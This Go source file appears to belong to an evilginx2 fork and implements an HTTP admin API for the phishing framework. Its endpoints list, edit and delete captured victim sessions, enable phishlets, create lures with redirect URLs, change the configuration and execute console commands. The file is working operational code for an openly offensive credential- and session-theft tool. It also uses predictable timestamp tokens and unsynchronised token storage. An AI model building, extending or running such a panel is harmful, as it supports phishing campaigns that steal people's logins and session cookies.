package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/log"
)

// HttpApiServer handles REST API requests
type HttpApiServer struct {
	service    *ApiService
	router     *mux.Router
	addr       string
	username   string
	password   string
	tokens     map[string]time.Time // Simple token storage (token -> expiry)
	certPath   string               // TLS certificate path
	keyPath    string               // TLS key path
}

// ApiResponse is the standard response wrapper
type ApiResponse struct {
	Success bool        `json:"success"`
	Data    interface{} `json:"data,omitempty"`
	Error   string      `json:"error,omitempty"`
}

// LoginRequest for authentication
type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

// CommandRequest for executing commands
type CommandRequest struct {
	Command string `json:"command"`
}

// SessionUpdateRequest for updating session fields
type SessionUpdateRequest struct {
	Field string      `json:"field"`
	Value interface{} `json:"value"`
}

// LureCreateRequest for creating lures
type LureCreateRequest struct {
	ID          string `json:"id"`
	Hostname    string `json:"hostname"`
	Path        string `json:"path"`
	RedirectUrl string `json:"redirect_url"`
	Phishlet    string `json:"phishlet"`
	Info        string `json:"info"`
}

// NewHttpApiServer creates a new HTTP API server
func NewHttpApiServer(service *ApiService, addr string, username string, password string) *HttpApiServer {
	server := &HttpApiServer{
		service:  service,
		router:   mux.NewRouter(),
		addr:     addr,
		username: username,
		password: password,
		tokens:   make(map[string]time.Time),
	}
	server.setupRoutes()
	return server
}

// setupRoutes configures all API routes
func (h *HttpApiServer) setupRoutes() {
	// Public routes - no auth required
	h.router.HandleFunc("/api/auth/login", h.login).Methods("POST")
	h.router.HandleFunc("/", h.serveIndex).Methods("GET")

	// Protected routes - require authentication
	h.router.HandleFunc("/api/sessions", h.auth(h.getSessions)).Methods("GET")
	h.router.HandleFunc("/api/sessions/{id}", h.auth(h.getSession)).Methods("GET")
	h.router.HandleFunc("/api/sessions/{id}", h.auth(h.updateSession)).Methods("PUT")
	h.router.HandleFunc("/api/sessions/{id}", h.auth(h.deleteSession)).Methods("DELETE")
	h.router.HandleFunc("/api/sessions", h.auth(h.deleteAllSessions)).Methods("DELETE")

	h.router.HandleFunc("/api/phishlets", h.auth(h.getPhishlets)).Methods("GET")
	h.router.HandleFunc("/api/phishlets/{name}/enable", h.auth(h.enablePhishlet)).Methods("POST")
	h.router.HandleFunc("/api/phishlets/{name}/disable", h.auth(h.disablePhishlet)).Methods("POST")

	h.router.HandleFunc("/api/lures", h.auth(h.getLures)).Methods("GET")
	h.router.HandleFunc("/api/lures", h.auth(h.createLure)).Methods("POST")
	h.router.HandleFunc("/api/lures/{id}", h.auth(h.deleteLure)).Methods("DELETE")

	h.router.HandleFunc("/api/config", h.auth(h.getConfig)).Methods("GET")
	h.router.HandleFunc("/api/config", h.auth(h.updateConfig)).Methods("PUT")

	h.router.HandleFunc("/api/execute", h.auth(h.executeCommand)).Methods("POST")

	// Serve React frontend (SPA)
	h.router.PathPrefix("/").Handler(http.FileServer(http.Dir("./frontend/dist")))
}

// auth middleware checks authentication token
func (h *HttpApiServer) auth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		authHeader := r.Header.Get("Authorization")
		if authHeader == "" {
			h.sendError(w, http.StatusUnauthorized, "missing authorization header")
			return
		}

		// Expected format: "Bearer <token>"
		parts := strings.Split(authHeader, " ")
		if len(parts) != 2 || parts[0] != "Bearer" {
			h.sendError(w, http.StatusUnauthorized, "invalid authorization format")
			return
		}

		token := parts[1]
		if expiry, ok := h.tokens[token]; ok && time.Now().Before(expiry) {
			next(w, r)
			return
		}

		h.sendError(w, http.StatusUnauthorized, "invalid or expired token")
	}
}

// ========== AUTH ENDPOINTS ==========

func (h *HttpApiServer) login(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate credentials
	if req.Username != h.username || req.Password != h.password {
		log.Warning("Failed login attempt - invalid username or password")
		h.sendError(w, http.StatusUnauthorized, "invalid username or password")
		return
	}

	// Generate simple token (in production, use JWT)
	token := generateToken()
	h.tokens[token] = time.Now().Add(24 * time.Hour)

	h.sendSuccess(w, http.StatusOK, map[string]interface{}{
		"token":  token,
		"expiry": h.tokens[token].Unix(),
	})
}

// ========== SESSION ENDPOINTS ==========

func (h *HttpApiServer) getSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := h.service.GetSessions()
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, sessions)
}

func (h *HttpApiServer) getSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		h.sendError(w, http.StatusBadRequest, "invalid session id")
		return
	}

	session, err := h.service.GetSessionById(id)
	if err != nil {
		h.sendError(w, http.StatusNotFound, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, session)
}

func (h *HttpApiServer) updateSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		h.sendError(w, http.StatusBadRequest, "invalid session id")
		return
	}

	var req SessionUpdateRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	err = h.service.UpdateSessionField(id, req.Field, req.Value)
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, map[string]string{"status": "updated"})
}

func (h *HttpApiServer) deleteSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		h.sendError(w, http.StatusBadRequest, "invalid session id")
		return
	}

	err = h.service.DeleteSession(id)
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, map[string]string{"status": "deleted"})
}

func (h *HttpApiServer) deleteAllSessions(w http.ResponseWriter, r *http.Request) {
	err := h.service.DeleteAllSessions()
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, map[string]string{"status": "all sessions cleared"})
}

// ========== PHISHLET ENDPOINTS ==========

func (h *HttpApiServer) getPhishlets(w http.ResponseWriter, r *http.Request) {
	phishlets, err := h.service.GetPhishlets()
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, phishlets)
}

func (h *HttpApiServer) enablePhishlet(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	err := h.service.EnablePhishlet(name)
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, map[string]string{"status": "enabled", "phishlet": name})
}

func (h *HttpApiServer) disablePhishlet(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	err := h.service.DisablePhishlet(name)
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, map[string]string{"status": "disabled", "phishlet": name})
}

// ========== LURE ENDPOINTS ==========

func (h *HttpApiServer) getLures(w http.ResponseWriter, r *http.Request) {
	lures, err := h.service.GetLures()
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, lures)
}

func (h *HttpApiServer) createLure(w http.ResponseWriter, r *http.Request) {
	var req LureCreateRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	err := h.service.CreateLure(req.ID, req.Hostname, req.Path, req.RedirectUrl, req.Phishlet, req.Info)
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusCreated, map[string]string{"status": "created", "id": req.ID})
}

func (h *HttpApiServer) deleteLure(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	err := h.service.DeleteLure(id)
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, map[string]string{"status": "deleted", "id": id})
}

// ========== CONFIG ENDPOINTS ==========

func (h *HttpApiServer) getConfig(w http.ResponseWriter, r *http.Request) {
	config := h.service.GetConfig()
	h.sendSuccess(w, http.StatusOK, config)
}

func (h *HttpApiServer) updateConfig(w http.ResponseWriter, r *http.Request) {
	var req map[string]string
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	for key, value := range req {
		err := h.service.UpdateConfig(key, value)
		if err != nil {
			h.sendError(w, http.StatusInternalServerError, err.Error())
			return
		}
	}

	h.sendSuccess(w, http.StatusOK, map[string]string{"status": "updated"})
}

// ========== COMMAND EXECUTION ==========

func (h *HttpApiServer) executeCommand(w http.ResponseWriter, r *http.Request) {
	var req CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	result, err := h.service.ExecuteCommand(req.Command)
	if err != nil {
		h.sendError(w, http.StatusInternalServerError, err.Error())
		return
	}

	h.sendSuccess(w, http.StatusOK, result)
}

// ========== STATIC FILES ==========

func (h *HttpApiServer) serveIndex(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "./frontend/dist/index.html")
}

// ========== UTILITY FUNCTIONS ==========

func (h *HttpApiServer) sendSuccess(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(ApiResponse{
		Success: true,
		Data:    data,
	})
}

func (h *HttpApiServer) sendError(w http.ResponseWriter, status int, errMsg string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(ApiResponse{
		Success: false,
		Error:   errMsg,
	})
}

// Start starts the HTTP server
func (h *HttpApiServer) Start(useHTTPS bool) error {
	log.Info("starting web admin dashboard on %s", h.addr)
	if useHTTPS && h.certPath != "" && h.keyPath != "" {
		return http.ListenAndServeTLS(h.addr, h.certPath, h.keyPath, h.router)
	}
	return http.ListenAndServe(h.addr, h.router)
}

// SetTLS sets the TLS certificate and key paths for HTTPS
func (h *HttpApiServer) SetTLS(certPath string, keyPath string) {
	h.certPath = certPath
	h.keyPath = keyPath
}

// generateToken generates a simple random token
func generateToken() string {
	return fmt.Sprintf("%d", time.Now().UnixNano())
}
